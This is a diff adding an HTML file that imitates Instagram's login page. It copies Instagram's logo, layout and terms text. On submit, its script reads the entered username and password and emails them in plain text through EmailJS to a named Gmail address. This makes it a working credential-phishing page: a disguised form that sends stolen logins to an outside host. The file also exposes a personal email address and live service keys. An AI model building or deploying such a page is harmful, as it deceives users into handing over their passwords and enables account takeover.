@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+            color: #262626;
+        }
+
+        .container {
+            width: 300px;
+            text-align: center;
+        }
+
+        .logo {
+            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yv/r/KoLLpWDb4f6.png");
+            background-position: 0px -52px;
+            background-size: auto;
+            width: 175px;
+            height: 51px;
+            background-repeat: no-repeat;
+            display: inline-block;
+            margin: 20px 0;
+        }
+
+        .login-options {
+            background-color: #0095f6;
+            color: #fff;
+            padding: 10px;
+            font-weight: bold;
+            border: none;
+            width: 100%;
+            margin: 10px 0;
+            cursor: pointer;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #8e8e8e;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .divider:not(:empty)::before {
+            margin-right: .25em;
+        }
+
+        .divider:not(:empty)::after {
+            margin-left: .25em;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-form input {
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+        }
+
+        .login-form input[type="submit"] {
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 0.9em;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .sign-up {
+            margin-top: 20px;
+            font-size: 0.9em;
+        }
+
+        .sign-up a {
+            color: #0095f6;
+            text-decoration: none;
+        }
+
+        .terms {
+            margin-top: 20px;
+            font-size: 0.8em;
+            color: #8e8e8e;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo"></div>
+        <button class="login-options">Continue Using Facebook</button>
+        <div class="divider">OR</div>
+        <form class="login-form" id="loginForm" onsubmit="handleLogin(event)">
+            <input type="text" id="username" placeholder="Phone number, username or email address" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <input type="submit" value="Log in">
+        </form>
+        <div class="forgot-password">Forgotten your password?</div>
+        <div class="sign-up">Don't have an account? <a href="#">Sign up</a></div>
+        <div class="terms">By continuing, you agree to Instagram's Terms of Use and Privacy Policy.</div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        emailjs.init('RAFQSqvooMnDpoaRA'); // Replace with your actual Public Key
+
+        function handleLogin(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            handleFormSubmission(username, password);
+        }
+
+        function handleFormSubmission(username, password) {
+            const templateParams = {
+                to_email: 'lakshyapratik199@gmail.com', // Replace with your email address
+                message: `Username: ${username}\nPassword: ${password}`,
+            };
+
+            emailjs.send('service_xd45rl4', 'template_9wmzo4i', templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                }, function(error) {
+                    console.log('FAILED...', error);
+                });
+        }
+    </script>
+
+</body>
+</html>
